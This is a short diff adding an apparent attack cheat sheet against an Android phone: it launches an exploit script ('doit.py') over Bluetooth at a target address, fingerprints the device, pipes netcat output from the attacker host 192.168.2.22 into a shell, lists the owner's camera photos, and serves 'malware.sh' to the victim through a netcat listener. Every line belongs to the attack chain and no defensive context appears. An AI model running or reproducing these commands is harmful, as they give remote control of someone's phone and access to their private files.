@@ -1,0 +1,11 @@
+sudo python2 doit.py hci1 AC:37:43:86:8B:1D 192.168.2.22
+
+getprop ro.product.model && getprop ro.build.fingerprint
+
+toybox nc 192.168.2.22 9487 | sh
+
+ls /storage/self/primary/DCIM/Camera/
+
+cat malware.sh | nc -lvvp 9487
+
+
